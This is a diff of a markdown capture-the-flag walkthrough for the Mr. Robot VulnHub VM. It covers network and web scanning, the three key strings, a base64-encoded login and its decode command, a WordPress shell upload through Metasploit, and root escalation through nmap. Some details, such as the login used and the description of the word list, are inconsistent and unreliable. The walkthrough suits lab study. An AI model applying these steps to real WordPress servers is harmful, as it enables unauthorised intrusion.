@@ -1,111 +1,151 @@
-**Getting Started**
-If you want to try out the Mr. Robot VM or follow along, you can download it [here](https://www.vulnhub.com/entry/mr-robot-1,151/)
+# VulnHub VM Write-ups: Mr. Robot
 
-**Prerequisites**
-Before starting, ensure you have:
-- A virtualization software (VirtualBox)
-- Kali Linux
-- Basic understanding of Linux commands
-- Network scanning tools (Nmap, Nikto)
-- Web exploitation tools
+> "When a bug finally makes itself known, it can be exhilarating, like you just unlocked something. A grand opportunity waiting to be taken advantage of." - Mr. Robot, 2016
 
-**Objective**
-Our goal is to find **3 keys** hidden in different locations. Each key is progressively more challenging to locate. This VM is designed for beginner to intermediate users, with no advanced exploitation or reverse engineering required
+ 
+Download [Mr. Robot VM](https://www.vulnhub.com/entry/mr-robot-1,151/)
 
-**The Hack**
-1. **Intelligence Gathering**: The first step in any penetration test is gathering information. This includes `footprinting` and `fingerprinting` hosts and servers. For more details, refer to the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page)
+## Description
 
-2. **Network Scanning**: Since the Mr. Robot VM is hosted on my PC using a `Bridged Adapter` in VirtualBox, we will scan our network to identify the IP address. Use the following command:
-   ```bash
-   2series@kali:~# netdiscover
-   ```
+This VM is inspired by the show Mr. Robot and contains three keys hidden in different locations. Our goal is to find all three keys, each progressively more challenging to locate. The difficulty level is considered beginner to intermediate, with no advanced exploitation or reverse engineering required.
 
-   This command will scan your network and display the IP address of the Mr. Robot VM
-   **Note**: The output of this command will provide information about the network and help identify the IP address of the Mr. Robot VM
+## The Hack
 
-3. **Nmap Scan**: Once we have the target IP, run an Nmap scan to check for open ports and services:
-   ```bash
-   2series@kali:~# nmap -sS -O -A -n 192.168.1.9
-   ```
+The first step in any penetration test, whether network or web-based, is intelligence gathering, which includes footprinting and fingerprinting hosts and servers. For more detailed procedures, I recommend reading the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).
 
-   This command will scan the target IP and display open ports and services and OS information
+Since the Mr. Robot VM is hosted on my PC using a `Bridged Adapter` over VirtualBox, we'll scan our network to identify the target IP address:
 
-4. **Nikto Scan**: Use Nikto to scan for vulnerabilities:
-   ```bash
-   2series@kali:~# nikto -h 192.168.1.9
-   ```
-
-   This command will scan the target IP and display vulnerabilities <e.g. SQL injection, cross-site scripting, and other web application security issues>
-
-5. **Access the Website**: Navigate to `http://192.168.1.9` in your browser. Explore the site and execute the available commands
-
-6. **Check robots.txt**: The `http://192.168.1.9/robots.txt` file reveals two locations:
-
-   User-agent: *
-   fsocity.dic
-   key-1-of-3.txt
-
-   This indicates the presence of two files: `fsocity.dic` and `key-1-of-3.txt`
-
-1. **Retrieve Key 1**: Access `http://192.168.1.9/key-1-of-3.txt` to find:
-51~   **Key 1**: `073403c8a58a1f80d943455fb30724b9`
-
-
-1. **Explore fsocity.dic**: Check `http://192.168.1.9/fsocity.dic` for a potential word list.
-
-The word list is used to brute-force the login page
-
-1.  **Check Other Files**: Explore `index.html`, `index.php`, and `/readme.html` for additional information
-    - `index.html`: Contains a link to `index.php`
-    - `index.php`: Contains the WordPress login page
-    - `/readme.html`: Contains a link to `http://192.168.1.9/wp-login.php`
-
-2.  **Decode Password**: Access `/license.txt` to find a base64 encoded password. Decode it:
+```bash
+2series@kali:~# netdiscover
 ```
-    ```bash
-    2series@kali:~# echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode
-    ```
-    This command will decode the base64 encoded password
-    **Username**: `elliot`
-    **Note**: The password is stored as a base64 encoded string and is not displayed in plain text in the terminal
+
+### Network Scan Results
+
 ```
-1.  **Log into WordPress**: Use the credentials to log into the WordPress admin page
-    ```bash
-    2series@kali:~# curl -X POST -d "log=admin&pwd=admin" http://192.168.1.9/wp-login.php
-    ```
-    This command will log into the WordPress admin page
-
-2.  **Scan for Vulnerabilities**: Check plugin versions and run WPScan to identify vulnerabilities
+Currently scanning: 192.168.98.0/16   |   Screen View: Unique Hosts           
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+_____________________________________________________________________________
+IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.1.1     [----Redacted---]      1      60  NETGEAR                     
+192.168.1.3     [----Redacted---]      1      60  Micro-Star INTL CO., LTD.   
+192.168.1.9     [----Redacted---]      1      60  Cadmus Computer Systems 
 ```
-    ```bash
-    2series@kali:~# wpscan --url http://192.168.1.9 --enumerate vp
-    ```
+
+The target IP is **192.168.1.9**. 
+
+Next, run an Nmap scan to check for open ports and probe for running services and operating systems:
+
+```bash
+2series@kali:~# nmap -sS -O -A -n 192.168.1.9
 ```
-1.  **Upload Shell**: Use Metasploit to upload an admin shell
-    
-2.  **Retrieve Key 2**: After gaining access, find:
-    **Key 2**: `822c73956184f694993bede3eb39f959`
 
-3.  **Post-Exploitation**: Run an Nmap scan on localhost to identify open ports and potential privilege escalation opportunities.
+### Nmap Scan Results
 
-    ```bash
-    # Check for SUID binaries
-    find / -perm -u=s -type f 2>/dev/null
-    # Check running services
-    ps aux
-    ```
-    **Note**: The output of these commands will provide information about SUID binaries and running services
+```
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2025-01-28 10:21 CDT
+Nmap scan report for 192.168.1.9
+Host is up (0.00040s latency).
+Not shown: 997 filtered ports
 
-4.  **Retrieve Key 3**: Access the root directory to find:
-    **Key 3**: `04787ddef27c3dee1ee161b21670b4e4`
+PORT    STATE  SERVICE  VERSION
+------- ------  -------  -------
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+```
 
-**Conclusion**
-Successfully captured all 3 keys and gained root access to the system! This exercise provided valuable insights into the hacking process and various exploitations.
+From our initial scans, we see that ports 80 and 443 are open, both running [Apache HTTPD](https://httpd.apache.org/), indicating this is a `web server`.
 
-**Tools Used**
-- Nmap: Network scanning
-- Nikto: Web vulnerability scanner
-- WPScan: WordPress vulnerability scanner
-- Metasploit Framework: Exploitation
-- Burp Suite: Web proxy
-- Various Linux command-line tools
+### Vulnerability Scanning with Nikto
+
+Next, run [Nikto](https://sectools.org/tool/nikto/) to scan for potential vulnerabilities or misconfigurations:
+
+```bash
+2series@kali:~# nikto -h 192.168.1.9
+```
+
+### Nikto Scan Results
+
+Nikto reveals several interesting findings, including:
+
+- The X-XSS-Protection header is not defined.
+- The X-Content-Type-Options header is not set.
+- A WordPress installation was found.
+
+With this information, we can access the website by navigating to **http://192.168.1.9** in our browser and explore the site.
+
+## Exploring the Website
+
+Upon accessing the site, we discover a UI that allows us to run six commands. While exploring, we also check the **/robots.txt** file, `http://192.168.1.9/robots.txt`which reveals two locations:
+
+> /robots.txt - is a text file that is used to prevent crawlers from indexing certain parts of a website. 
+
+```
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+### Finding the First Key
+
+Let's navigate to **http://192.168.1.9/key-1-of-3.txt** to retrieve the first key:
+
+```
+Key 1: 073403c8a58a1f80d943455fb30724b9
+```
+
+### Exploring the Word List
+
+Next, we check **http://192.168.1.9/fsocity.dic**, which appears to be a C source code file, likely a word list for brute-forcing.
+
+### Further Exploration
+
+We then explore the **/readme.html** and **/license.txt** files to gather more information about the WordPress version and potential vulnerabilities.
+
+## Gaining Access
+
+With the credentials obtained from **/license.txt**, we attempt to log in to the WordPress admin page at **/wp-login/**. After successfully logging in as Elliot, we explore the plugins and their versions.
+
+### Running WPScan
+
+To identify vulnerabilities:
+
+```bash
+root@kali:~# wpscan -u 192.168.1.9 -e vp
+```
+
+### WPScan Results
+
+The scan identifies several vulnerabilities associated with the WordPress version and installed plugins. With admin access, we can now attempt to upload a shell using Metasploit.
+
+## Uploading a Shell
+
+We launch Metasploit and use the `wp_admin_shell_upload` exploit:
+
+```bash
+2series@kali:~# msfconsole
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+```
+
+After setting the required options, we successfully upload a payload and establish a Meterpreter session.
+
+### Finding the Second Key
+
+From the Meterpreter session, we navigate to the home directory of the robot user and find the second key:
+
+```
+Key 2: 822c73956184f694993bede3eb39f959
+```
+
+## Privilege Escalation
+
+To access the root directory, we perform privilege escalation using an old version of Nmap that supports an interactive shell. After gaining root access, we retrieve the final key:
+
+```
+Key 3: 04787ddef27c3dee1ee161b21670b4e4
+```
+
+## Conclusion
+
+Congratulations! successfully navigated the Mr. Robot VM, found all three keys, and learned valuable skills in penetration testing!
